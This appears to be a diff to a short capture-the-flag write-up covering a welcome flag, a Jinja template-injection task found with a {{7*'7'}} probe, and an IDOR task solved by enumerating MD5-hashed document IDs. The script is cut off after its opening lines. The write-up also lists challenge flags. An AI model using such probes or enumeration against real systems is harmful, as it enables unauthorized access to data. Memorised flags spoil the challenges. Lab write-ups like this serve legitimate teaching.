@@ -1,4 +1,6 @@
-Welcome flag 
+# mimiCTF Write-up
+
+## Welcome flag 
 
 Just check TG group by link in task description and search flag!
 
@@ -6,7 +8,7 @@ FLAG:
 
     mimictf{w3lc0m3_t0_th3_c1ub_buddy}
 
-Task-2
+## Task-1
 
 Here we find `SSTI` vulnerability by entering the payload `{{7*‘7’}}` instead of the username and see that the response is 49. So it's vulnerable jinja template for `SSTI`
 
@@ -20,14 +22,18 @@ FLAG:
 
     mimictf{55t1_1nj3ct10n_s1mple99928}
 
-TASK-3
+## Task-2
+
+Here we see that we have an `ID` in `MD5` format, so this is an `IDOR` vulnerability. We need to find the correct `ID` with the flag. 
+
+Let's try to do this faster with a script!
 
 Script:
 
     import hashlib
     import requests
     
-    base_url = "http://134.209.254.230:5002/document/"  # Change to real target URL with id param
+    base_url = "http://134.209.254.230:5002/document/" 
     
     def md5_hash(value):
         return hashlib.md5(str(value).encode()).hexdigest()
